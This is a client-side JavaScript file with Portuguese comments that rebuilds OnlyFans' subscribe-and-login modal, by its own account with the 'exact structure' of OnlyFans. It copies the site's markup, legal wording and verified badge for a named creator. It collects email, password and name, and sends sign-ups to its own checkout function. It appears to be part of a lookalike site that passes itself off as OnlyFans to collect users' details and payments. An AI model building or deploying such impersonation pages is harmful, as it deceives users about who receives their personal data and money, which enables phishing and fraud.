// Modal de Autenticação - Estrutura Exata do OnlyFans
(function() {
    'use strict';
    
    let currentPlanId = null;
    let isSignUpMode = false;
    let profileData = null;
    
    // Criar modal HTML (estrutura exata do OnlyFans)
    function createModalHTML() {
        const modalHTML = `
            <div data-v-697a21f8="" id="ModalSubscribe___BV_modal_outer_" style="position:absolute;z-index:1040">
                <div id="ModalSubscribe" role="dialog" aria-describedby="ModalSubscribe___BV_modal_body_" class="modal fade show m-guest b-modal b-modal__subscribe" aria-modal="true" style="display:none">
                    <div class="modal-dialog modal-sm modal-dialog-centered">
                        <span tabindex="0"></span>
                        <div id="ModalSubscribe___BV_modal_content_" tabindex="-1" class="modal-content">
                            <div id="ModalSubscribe___BV_modal_body_" class="modal-body m-reset-body-paddings">
                                <div data-v-697a21f8="" class="b-scrolled-modal-content m-view-in-viewport m-native-custom-scrollbar m-invisible-scrollbar m-scrollbar-y">
                                    <div data-v-697a21f8="" class="b-users__item m-modal-subscriptions">
                                        <div data-v-697a21f8="" class="b-users__item__inner">
                                            <div data-v-697a21f8="" class="b-users__item__cover__wrapper m-size-sm g-negative-sides-gaps">
                                                <img data-v-697a21f8="" id="modal-cover-img" src="" alt="" loading="lazy" class="b-users__item__cover">
                                            </div>
                                            <div data-v-3ea4788a="" data-v-697a21f8="" class="b-profile__user d-flex align-items-start m-inside-modelcard">
                                                <span data-v-1fc852bb="" data-v-697a21f8="" class="g-avatar m-reset-wcag-link-focus m-guest online_status_class online m-w100" data-v-3ea4788a="">
                                                    <div data-v-68e1ca32="" data-v-1fc852bb="" class="g-avatar__img-wrapper">
                                                        <img id="modal-avatar-img" loading="lazy" alt="" src="" data-v-68e1ca32="">
                                                    </div>
                                                </span>
                                                <div data-v-697a21f8="" data-v-3ea4788a="" class="b-profile__user__info m-with-status">
                                                    <div data-v-697a21f8="" data-v-3ea4788a="" class="b-profile__names mw-0">
                                                        <div data-v-697a21f8="" data-v-3ea4788a="" class="b-username-row m-gap-lg-extra">
                                                            <a data-v-697a21f8="" href="#" tabindex="" class="b-username" data-v-3ea4788a="">
                                                                <div class="g-user-name m-verified m-md-size" id="modal-display-name">
                                                                    Victoria Matosa
                                                                    <svg class="m-verified g-icon" data-icon-name="icon-verified" aria-hidden="true">
                                                                        <use href="#icon-verified" xlink:href="#icon-verified"></use>
                                                                    </svg>
                                                                </div>
                                                            </a>
                                                        </div>
                                                        <div data-v-697a21f8="" data-v-3ea4788a="" class="b-username-row m-width-limit">
                                                            <a data-v-697a21f8="" href="#" aria-current="page" class="g-user-realname__wrapper m-nowrap-text" data-v-3ea4788a="">
                                                                <div data-v-697a21f8="" class="g-user-username" id="modal-username">
                                                                    @babymatosao
                                                                </div>
                                                            </a>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div data-v-697a21f8="" class="b-modal__user__desc">
                                                <div data-v-697a21f8="" class="b-modal__user__desc__title">
                                                    Subscribe and get these benefits:
                                                </div>
                                                <ul data-v-697a21f8="" class="b-modal__list">
                                                    <li data-v-697a21f8="" class="b-modal__list__item">
                                                        <div data-v-697a21f8="" class="b-modal__list__icon">
                                                            <svg data-v-697a21f8="" data-icon-name="icon-done" aria-hidden="true" class="g-icon">
                                                                <use href="#icon-done" xlink:href="#icon-done"></use>
                                                            </svg>
                                                        </div>
                                                        <div data-v-697a21f8="" class="b-modal__list__title">
                                                            Full access to this user's content
                                                        </div>
                                                    </li>
                                                    <li data-v-697a21f8="" class="b-modal__list__item">
                                                        <div data-v-697a21f8="" class="b-modal__list__icon">
                                                            <svg data-v-697a21f8="" data-icon-name="icon-done" aria-hidden="true" class="g-icon">
                                                                <use href="#icon-done" xlink:href="#icon-done"></use>
                                                            </svg>
                                                        </div>
                                                        <div data-v-697a21f8="" class="b-modal__list__title">
                                                            Direct message with this user
                                                        </div>
                                                    </li>
                                                    <li data-v-697a21f8="" class="b-modal__list__item">
                                                        <div data-v-697a21f8="" class="b-modal__list__icon">
                                                            <svg data-v-697a21f8="" data-icon-name="icon-done" aria-hidden="true" class="g-icon">
                                                                <use href="#icon-done" xlink:href="#icon-done"></use>
                                                            </svg>
                                                        </div>
                                                        <div data-v-697a21f8="" class="b-modal__list__title">
                                                            Cancel your subscription at any time
                                                        </div>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                    <form data-v-451b4fbe="" data-v-697a21f8="" novalidate="" class="b-loginreg__form m-main-form g-sides-gaps m-form-subscriptions" id="auth-form">
                                        <h3 data-v-451b4fbe="" id="form-title">Log in to subscribe</h3>
                                        
                                        <!-- Campo Nome (oculto por padrão) -->
                                        <div data-v-4e723aa7="" data-v-451b4fbe="" class="g-input__wrapper input-text-field m-empty" id="name-field" style="display: none;">
                                            <div data-v-4e723aa7="">
                                                <div data-v-4e723aa7="" class="v-input form-control g-input mb-0 v-input--hide-details theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
                                                    <div class="v-input__control">
                                                        <div class="v-input__slot">
                                                            <fieldset aria-hidden="true">
                                                                <legend style="width:0px"><span class="notranslate">&ZeroWidthSpace;</span></legend>
                                                            </fieldset>
                                                            <div class="v-text-field__slot">
                                                                <label for="input-name" class="v-label theme--light" style="left:0px;right:auto;position:absolute">Name</label>
                                                                <input at-attr="input" autocomplete="name" name="name" id="input-name" type="text" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <!-- Campo Email -->
                                        <div data-v-4e723aa7="" data-v-451b4fbe="" class="g-input__wrapper input-text-field m-empty" data-vv-as="Email" at-attr="login_email">
                                            <div data-v-4e723aa7="">
                                                <div data-v-4e723aa7="" class="v-input form-control g-input mb-0 v-input--hide-details theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
                                                    <div class="v-input__control">
                                                        <div class="v-input__slot">
                                                            <fieldset aria-hidden="true">
                                                                <legend style="width:0px"><span class="notranslate">&ZeroWidthSpace;</span></legend>
                                                            </fieldset>
                                                            <div class="v-text-field__slot">
                                                                <label for="input-email" class="v-label theme--light" style="left:0px;right:auto;position:absolute">Email</label>
                                                                <input at-attr="input" autocomplete="on" name="email" required="" id="input-email" type="email" value="">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <!-- Campo Password -->
                                        <div data-v-4e723aa7="" data-v-451b4fbe="" class="g-input__wrapper input-text-field m-with-field-control m-empty" data-vv-as="Password" at-attr="login_password">
                                            <div data-v-4e723aa7="">
                                                <div data-v-4e723aa7="" class="v-input form-control g-input mb-0 theme--light v-text-field v-text-field--is-booted v-text-field--enclosed v-text-field--outlined v-text-field--placeholder">
                                                    <div class="v-input__control">
                                                        <div class="v-input__slot">
                                                            <fieldset aria-hidden="true">
                                                                <legend style="width:0px"><span class="notranslate">&ZeroWidthSpace;</span></legend>
                                                            </fieldset>
                                                            <div class="v-text-field__slot">
                                                                <label for="input-password" class="v-label theme--light" style="left:0px;right:auto;position:absolute">Password</label>
                                                                <input at-attr="input" autocomplete="on" name="password" required="" id="input-password" type="password">
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        
                                        <button data-v-451b4fbe="" type="submit" at-attr="submit" class="g-btn m-rounded m-block m-md mb-0" id="submit-btn">
                                            Log in
                                        </button>
                                        
                                        <div data-v-451b4fbe="" class="b-loginreg__form__issues">
                                            By logging in and using OnlyFans, you agree to our 
                                            <a href="https://onlyfans.com/terms">Terms of Service</a> and 
                                            <a href="https://onlyfans.com/privacy">Privacy Policy</a>, 
                                            and confirm that you are at least 18 years old.
                                        </div>
                                        
                                        <div data-v-451b4fbe="" class="b-loginreg__links">
                                            <span data-v-451b4fbe="">
                                                <button data-v-451b4fbe="" type="button" at-attr="forgot_password" class="g-btn m-flat forgot m-reset-width m-no-uppercase m-default-font-weight">
                                                    Forgot password?
                                                </button>
                                            </span>
                                            <span data-v-451b4fbe="">
                                                <button data-v-451b4fbe="" at-attr="sign_up" type="button" class="g-btn m-flat m-reset-width m-no-uppercase m-default-font-weight" id="toggle-mode-btn">
                                                    Sign up for OnlyFans
                                                </button>
                                            </span>
                                        </div>
                                    </form>
                                </div>
                            </div>
                            <footer id="ModalSubscribe___BV_modal_footer_" class="modal-footer g-border-top">
                                <button data-v-697a21f8="" type="button" class="g-btn m-flat m-btn-gaps m-reset-width" id="close-modal-btn">
                                    Close
                                </button>
                            </footer>
                        </div>
                        <span tabindex="0"></span>
                    </div>
                </div>
                <div id="ModalSubscribe___BV_modal_backdrop_" class="modal-backdrop" style="display:none"></div>
            </div>
        `;
        
        document.body.insertAdjacentHTML('beforeend', modalHTML);
    }
    
    // Carregar dados do perfil (usa cache se disponível)
    async function loadProfileData() {
        // Verificar se já temos os dados em cache
        if (window.profileCache) {
            profileData = window.profileCache;
            console.log('✅ Usando dados do perfil do cache');
            return;
        }
        
        const username = window.location.pathname.split('/').filter(Boolean)[0] || 'babymatosao';
        
        try {
            const response = await fetch(`/api/profile/${username}`);
            profileData = await response.json();
            window.profileCache = profileData; // Salvar no cache
            console.log('✅ Dados do perfil carregados:', profileData);
        } catch (error) {
            console.error('❌ Erro ao carregar perfil:', error);
        }
    }
    
    // Atualizar modal com dados do perfil
    function updateModalWithProfile() {
        if (!profileData) return;
        
        // Atualizar imagens
        const coverImg = document.getElementById('modal-cover-img');
        const avatarImg = document.getElementById('modal-avatar-img');
        
        if (coverImg && profileData.cover_photo) {
            coverImg.src = profileData.cover_photo;
            coverImg.alt = profileData.display_name || profileData.username;
        }
        
        if (avatarImg && profileData.profile_photo) {
            avatarImg.src = profileData.profile_photo;
            avatarImg.alt = profileData.display_name || profileData.username;
        }
        
        // Atualizar textos
        const displayName = document.getElementById('modal-display-name');
        const username = document.getElementById('modal-username');
        
        if (displayName) {
            displayName.innerHTML = `
                ${profileData.display_name || profileData.username}
                <svg class="m-verified g-icon" data-icon-name="icon-verified" aria-hidden="true">
                    <use href="#icon-verified" xlink:href="#icon-verified"></use>
                </svg>
            `;
        }
        
        if (username) {
            username.textContent = `@${profileData.username}`;
        }
    }
    
    // Abrir modal
    function openModal(planId) {
        currentPlanId = planId;
        
        updateModalWithProfile();
        
        const modal = document.getElementById('ModalSubscribe');
        const backdrop = document.getElementById('ModalSubscribe___BV_modal_backdrop_');
        
        if (modal && backdrop) {
            modal.style.display = 'block';
            backdrop.style.display = 'block';
            document.body.style.overflow = 'hidden';
            document.documentElement.classList.add('m-prevent-scrolling');
        }
    }
    
    // Fechar modal
    function closeModal() {
        const modal = document.getElementById('ModalSubscribe');
        const backdrop = document.getElementById('ModalSubscribe___BV_modal_backdrop_');
        
        if (modal && backdrop) {
            modal.style.display = 'none';
            backdrop.style.display = 'none';
            document.body.style.overflow = '';
            document.documentElement.classList.remove('m-prevent-scrolling');
        }
        
        // Resetar para modo login
        if (isSignUpMode) {
            toggleMode();
        }
    }
    
    // Alternar entre Login e Sign Up
    function toggleMode() {
        isSignUpMode = !isSignUpMode;
        
        const title = document.getElementById('form-title');
        const nameField = document.getElementById('name-field');
        const submitBtn = document.getElementById('submit-btn');
        const toggleBtn = document.getElementById('toggle-mode-btn');
        
        if (isSignUpMode) {
            title.textContent = 'Create your account';
            nameField.style.display = 'block';
            submitBtn.textContent = 'Sign Up';
            toggleBtn.textContent = 'Log in to subscribe';
        } else {
            title.textContent = 'Log in to subscribe';
            nameField.style.display = 'none';
            submitBtn.textContent = 'Log in';
            toggleBtn.textContent = 'Sign up for OnlyFans';
        }
    }
    
    // Processar formulário
    function handleSubmit(e) {
        e.preventDefault();
        
        const name = document.getElementById('input-name').value.trim();
        const email = document.getElementById('input-email').value.trim();
        const password = document.getElementById('input-password').value;
        
        if (!email || !password) {
            alert('Please fill in all required fields');
            return;
        }
        
        if (isSignUpMode) {
            if (!name) {
                alert('Please enter your name');
                return;
            }
            
            // Sign Up - redirecionar para checkout
            closeModal();
            
            if (typeof window.subscribeToProfile === 'function') {
                window.subscribeToProfile(currentPlanId, email, name);
            } else {
                console.error('❌ Função de assinatura não encontrada');
            }
        } else {
            // Log in - apenas fechar e reabrir
            alert('Login functionality would go here. Click "Sign up for OnlyFans" to proceed to checkout.');
        }
    }
    
    // Inicializar
    async function init() {
        await loadProfileData();
        createModalHTML();
        
        // Event listeners
        document.getElementById('close-modal-btn').addEventListener('click', closeModal);
        document.getElementById('toggle-mode-btn').addEventListener('click', toggleMode);
        document.getElementById('auth-form').addEventListener('submit', handleSubmit);
        
        // Fechar ao clicar no backdrop
        document.getElementById('ModalSubscribe___BV_modal_backdrop_').addEventListener('click', closeModal);
        
        // Expor função globalmente
        window.openSubscriptionAuthModal = openModal;
        
        console.log('✅ Modal OnlyFans inicializado');
    }
    
    // Inicializar quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();

